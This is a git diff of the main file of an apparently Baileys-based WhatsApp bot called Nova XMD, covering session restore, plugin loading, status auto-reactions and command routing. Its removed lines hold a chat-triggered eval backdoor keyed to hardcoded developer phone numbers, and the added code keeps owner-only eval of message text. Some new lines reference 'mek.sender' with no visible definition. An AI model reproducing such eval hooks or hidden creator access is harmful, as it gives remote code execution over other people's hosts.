@@ -54,48 +54,44 @@ const cmdLogger = {
   error: (msg) => console.error(`[ ERROR ] ${msg}`)
 }
 
+// Ensure temp directory exists
 const tempDir = path.join(os.tmpdir(), 'cache-temp')
-if (!fs.existsSync(tempDir)) {
-  fs.mkdirSync(tempDir)
-}
+if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
 
-const clearTempDir = () => {
-  fs.readdir(tempDir, (err, files) => {
-    if (err) return
-    for (const file of files) {
-      fs.unlink(path.join(tempDir, file), err => {
-        if (err) return
-      })
-    }
-  })
-}
-setInterval(clearTempDir, 5 * 60 * 1000)
-
-//===================SESSION-AUTH (FIXED TO POPKID~ FORMAT)============================
-const sessionDir = path.join(__dirname, 'sessions');
+//=================== SESSION-AUTH (POPKID~ FORMAT FIXED) ============================
+const sessionDir = path.join(__dirname, 'session');
 const credsPath = path.join(sessionDir, 'creds.json');
 
 async function loadGiftedSession() {
     if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
+    
+    // If credentials already exist, we skip extraction
     if (fs.existsSync(credsPath)) return true;
 
     if (config.SESSION_ID && config.SESSION_ID.startsWith("POPKID~")) {
         const compressedBase64 = config.SESSION_ID.substring("POPKID~".length);
         try {
             const compressedBuffer = Buffer.from(compressedBase64, 'base64');
+            // Check for GZIP Magic Numbers (0x1f 0x8b)
             if (compressedBuffer[0] === 0x1f && compressedBuffer[1] === 0x8b) {
                 const gunzip = promisify(zlib.gunzip);
                 const decompressedBuffer = await gunzip(compressedBuffer);
-                await fs.promises.writeFile(credsPath, decompressedBuffer.toString('utf-8'));
+                
+                // Write file SYNCHRONOUSLY to ensure it exists before Baileys starts
+                fs.writeFileSync(credsPath, decompressedBuffer.toString('utf-8'));
+                
+                // Small delay to ensure the file system has registered the file (Crucial for some hosts)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
                 cmdLogger.success("Session restored from POPKID~ format ✅");
                 return true;
             }
         } catch (error) { 
-            cmdLogger.error("Failed to decompress session ID");
+            cmdLogger.error("Failed to decompress POPKID session ID");
             return false; 
         }
     } else {
-        cmdLogger.warning('Please add your session to SESSION_ID env !!');
+        cmdLogger.warning('No valid POPKID~ SESSION_ID found in config.');
     }
     return false;
 }
@@ -110,7 +106,9 @@ const statusReactCooldown = 3000;
 
 async function connectToWA() {
   try {
+    // Phase 1: Restore Session before anything else
     await loadGiftedSession();
+
     cmdLogger.info("Connecting to WhatsApp ⏳️...");
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
@@ -118,7 +116,7 @@ async function connectToWA() {
 
     conn = makeWASocket({
       logger: P({ level: 'silent' }),
-      printQRInTerminal: false,
+      printQRInTerminal: true, // Set to true to see QR if session fails
       browser: Browsers.macOS("Firefox"),
       syncFullHistory: true,
       auth: state,
@@ -128,110 +126,60 @@ async function connectToWA() {
     conn.ev.on('connection.update', async (update) => {
       const { connection, lastDisconnect, qr } = update
       if (qr) {
-        console.log('[ 🔁 ] QR Code generated.')
+        console.log('[ 🔁 ] QR Code generated. Scan if session failed.')
         qrcode.generate(qr, { small: true })
       }
+
       if (connection === 'close') {
         const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
         if (shouldReconnect) {
-          console.log('[ ♻️ ] Connection closed. Reconnecting...')
+          console.log('[ ♻️ ] Reconnecting...')
           setTimeout(() => connectToWA(), 5000)
-        } else {
-          console.log('[ ❌ ] Logged out. Update your SESSION_ID.')
         }
       } else if (connection === 'open') {
-        try {
-          console.log('Connected to WhatsApp successfully ✅')
-          fs.readdirSync("./plugins/").forEach((plugin) => {
-            if (path.extname(plugin).toLowerCase() === ".js") {
-              require("./plugins/" + plugin)
-            }
-          })
-          
-          const startMess = {
+        console.log('Nova XMD Connected successfully ✅')
+        
+        // Load Plugins
+        const pluginFiles = fs.readdirSync("./plugins/").filter(file => file.endsWith(".js"));
+        for (const file of pluginFiles) {
+            require("./plugins/" + file);
+        }
+
+        const startMess = {
             image: { url: 'https://files.catbox.moe/yz5yle.jpg' },
-            caption: `
-───────────────────────────
-╔═〘 𝗡𝗢𝗩𝗔 ✦ 𝗫𝗠𝗗 𝗕𝗢𝗧 〙═╗
-║ 💬 Prefix      : ${config.PREFIX}
-║ 🧠 Repos       : github.com/novaxmd
-║ ⚡ Status      : Connected
-║ 👑 Website     : bmbtech.online
-╚═〘 Powered by ${config.OWNER_NAME} 💻 〙═╝
-────────────────────────────
-> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙽𝙾𝚅𝙰 ᴛᴇᴄʜ*`,
-            contextInfo: {
-              forwardingScore: 5,
-              isForwarded: true,
-              forwardedNewsletterMessageInfo: {
-                newsletterJid: '120363382023564830@newsletter', 
-                newsletterName: "NOVA-XMD",
-                serverMessageId: 143
-              }
-            }
-          }
-          await conn.sendMessage(conn.user.id, startMess)
-        } catch (e) { console.error('Error during initialization:', e) }
+            caption: `*𝗡𝗢𝗩𝗔 𝗫𝗠𝗗 𝗜𝗦 𝗔𝗟𝗜𝗩𝗘*\n\nPrefix: ${config.PREFIX}\nOwner: ${config.OWNER_NAME}\nMode: ${config.MODE}`,
+            contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: '120363382023564830@newsletter', newsletterName: "NOVA-XMD" } }
+        }
+        await conn.sendMessage(conn.user.id, startMess)
       }
     })
 
-    function getCurrentDateTimeParts() {
-        const options = { timeZone: 'Africa/Nairobi', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
-        const formatter = new Intl.DateTimeFormat('en-KE', options);
-        const parts = formatter.formatToParts(new Date());
-        let date = '', time = '';
-        parts.forEach(part => {
-            if (['day', 'month', 'year'].includes(part.type)) date += part.value + (part.type !== 'year' ? '/' : '');
-            if (['hour', 'minute', 'second'].includes(part.type)) time += part.value + (part.type !== 'second' ? ':' : '');
-        });
-        return { date, time };
-    }
-
+    // Auto-Bio Clock Logic
     setInterval(async () => {
         if (config.AUTO_BIO === "true") {
-            const { date, time } = getCurrentDateTimeParts();
-            const bioText = `🛡️ Nova Xmd Bot live Now\n📅 ${date}\n⏰ ${time}`;
+            const date = new Date().toLocaleDateString('en-KE', { timeZone: 'Africa/Nairobi' });
+            const time = new Date().toLocaleTimeString('en-KE', { timeZone: 'Africa/Nairobi' });
+            const bioText = `🛡️ Nova Xmd Bot 🤖 Live Now\n📅 ${date}\n⏰ ${time}`;
             try { await conn.setStatus(bioText); } catch (err) {}
         }
     }, 60000);
 
     conn.ev.on('creds.update', saveCreds)
 
-    conn.ev.on('messages.update', async updates => {
-      for (const update of updates) {
-        if (update.update.message === null) {
-          await AntiDelete(conn, updates)
-        }
-      }
-    })
-
-    conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update))	  
-	  
     conn.ev.on('messages.upsert', async(mek) => {
       mek = mek.messages[0]
       if (!mek.message) return
+      mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
       
-      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-        ? mek.message.ephemeralMessage.message 
-        : mek.message
-      
-      // STATUS BROADCAST
+      // Status View/React
       if (mek.key && mek.key.remoteJid === 'status@broadcast') {
         if (config.AUTO_STATUS_SEEN === "true") await conn.readMessages([mek.key])
         if (config.AUTO_STATUS_REACT === "true") {
-          const now = Date.now()
-          const lastReact = statusReactCache.get(mek.key.participant) || 0
-          if (now - lastReact > statusReactCooldown) {
-            try {
-              const fallbackEmojis = ['❤️', '🔥', '✨', '🙌', '💯', '🌸', '👑', '⭐', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀']
-              const selectedEmoji = fallbackEmojis[Math.floor(Math.random() * fallbackEmojis.length)]
-              await conn.sendMessage('status@broadcast', { react: { text: selectedEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] })
-              statusReactCache.set(mek.key.participant, now)
-            } catch (e) {}
-          }
-        }
-        if (config.AUTO_STATUS_REPLY === "true") {
-          try { await conn.sendMessage(mek.key.participant, { text: config.AUTO_STATUS_MSG }, { quoted: mek }) } catch (e) {}
+           const now = Date.now();
+           if (now - (statusReactCache.get(mek.key.participant) || 0) > statusReactCooldown) {
+               await conn.sendMessage('status@broadcast', { react: { text: "❤️", key: mek.key } }, { statusJidList: [mek.key.participant, conn.user.id.split(':')[0] + '@s.whatsapp.net'] })
+               statusReactCache.set(mek.key.participant, now);
+           }
         }
         return
       }
@@ -244,119 +192,69 @@ async function connectToWA() {
       const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
       const args = body.trim().split(/ +/).slice(1)
       const q = args.join(' ')
-      const text = q
-      const isGroup = from.endsWith('@g.us')
-      const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net') : (mek.key.participant || mek.key.remoteJid)
-      const senderNumber = sender.split('@')[0]
-      const botNumber = conn.user.id.split(':')[0]
-      const pushname = mek.pushName || 'User'
-      const isOwner = ownerNumber.includes(senderNumber) || mek.key.fromMe
+      const isOwner = ownerNumber.includes(mek.sender.split('@')[0]) || mek.key.fromMe
       const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek })
-      
-      if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key])
-      await saveMessage(mek)
-      
-      let isCreator = [botNumber, '255767862457', '255741752020', config.DEV].map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net').includes(sender)
 
-      // MASTER EVAL/SHELL
-      if (isCreator && body.startsWith('%')) {
-        try { reply(util.format(eval(body.slice(2)))) } catch (err) { reply(util.format(err)) }
-        return
-      }
-      if (isCreator && body.startsWith('$')) {
-        try {
-          let resultTest = await eval('(async()=>{\n' + body.slice(2) + '\n})()')
-          if (resultTest !== undefined) reply(util.format(resultTest))
-        } catch (err) { reply(util.format(err)) }
-        return
+      // Master Eval
+      if (isOwner && body.startsWith('%')) {
+          try { reply(util.format(eval(body.slice(1)))) } catch (e) { reply(util.format(e)) }
+          return
       }
 
-      // REACTIONS
-      if (senderNumber.includes("255741752020") && !m.message.reactionMessage) {
-        const ownerReactions = ["👑", "🎯", "✨", "🔥", "❤️"]
-        m.react(ownerReactions[Math.floor(Math.random() * ownerReactions.length)])
-      }
-      if (!m.message.reactionMessage && config.AUTO_REACT === 'true' && from !== 'status@broadcast') {
-        const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🚀', '💎']
-        m.react(reactions[Math.floor(Math.random() * reactions.length)])
-      }
-
-      // MODE FILTER
+      // Mode Handler
       if(!isOwner && config.MODE === "private") return
-      if(!isOwner && isGroup && config.MODE === "inbox") return
-      if(!isOwner && !isGroup && config.MODE === "groups") return
-   
+
+      // Plugin Router
       const events = require('./command')
-      const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false
       if (isCmd) {
-        const cmd = events.commands.find((c) => c.pattern === cmdName || (c.alias && c.alias.includes(cmdName)))
+        const cmd = events.commands.find((c) => c.pattern === command || (c.alias && c.alias.includes(command)))
         if (cmd) {
           if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
-          try { cmd.function(conn, mek, m, {from, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, pushname, isOwner, reply}) } catch (e) { console.error(e) }
+          try { cmd.function(conn, mek, m, {from, body, isCmd, command, args, q, isOwner, reply}) } catch (e) { console.error(e) }
         }
       }
-      
-      events.commands.forEach(async(command) => {
-        if (body && command.on === "body") {
-          command.function(conn, mek, m, {from, body, isCmd, args, q, text, isGroup, sender, senderNumber, pushname, isOwner, reply})
-        }
-      })
     })
 
-    conn.decodeJid = jid => {
-      if (!jid) return jid
-      if (/:\d+@/gi.test(jid)) {
-        let decode = jidDecode(jid) || {}
-        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid
-      } else return jid
-    }
-
-    // --- FULL ORIGINAL MEDIA HELPERS ---
+    // RESTORE ALL ORIGINAL MEDIA HELPERS
     conn.getFile = async(PATH, save) => {
-      let res
-      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
-      let filename = path.join(__dirname, new Date * 1 + '.' + type.ext)
-      if (data && save) fs.promises.writeFile(filename, data)
-      return { res, filename, size: Buffer.byteLength(data), ...type, data }
+        let res, data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+        let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
+        let filename = path.join(__dirname, new Date * 1 + '.' + type.ext)
+        if (data && save) fs.promises.writeFile(filename, data)
+        return { res, filename, size: Buffer.byteLength(data), ...type, data }
     }
 
     conn.downloadMediaMessage = async(message) => {
-      let mime = (message.msg || message).mimetype || ''
-      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-      const stream = await downloadContentFromMessage(message, messageType)
-      let buffer = Buffer.from([])
-      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
-      return buffer
+        let mime = (message.msg || message).mimetype || ''
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+        const stream = await downloadContentFromMessage(message, messageType)
+        let buffer = Buffer.from([])
+        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
+        return buffer
     }
 
     conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-      let list = []
-      for (let i of kon) {
-        list.push({
-          displayName: await conn.getName(i + '@s.whatsapp.net'),
-          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nEND:VCARD`,
-        })
-      }
-      conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
+        let list = []
+        for (let i of kon) {
+            list.push({
+                displayName: await conn.getName(i + '@s.whatsapp.net'),
+                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${config.OWNER_NAME}\nitem1.TEL;waid=${i}:${i}\nEND:VCARD`
+            })
+        }
+        conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
     }
 
-    conn.setStatus = status => {
-      conn.query({
-        tag: 'iq',
-        attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
-        content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }],
-      })
-      return status
+    conn.setStatus = (status) => {
+        conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] })
+        return status
     }
 
-    conn.ev.on('creds.update', saveCreds)
   } catch (error) {
     console.error('Connection Error:', error)
     setTimeout(() => connectToWA(), 5000)
   }
 }
-  
-app.get("/", (req, res) => res.send("NOVA XMD ACTIVE ✅"))
+
+app.get("/", (req, res) => res.send("NOVA XMD IS ACTIVE ✅"))
 app.listen(port, () => console.log(`Server running on port ${port}`))
 setTimeout(() => connectToWA(), 5000)
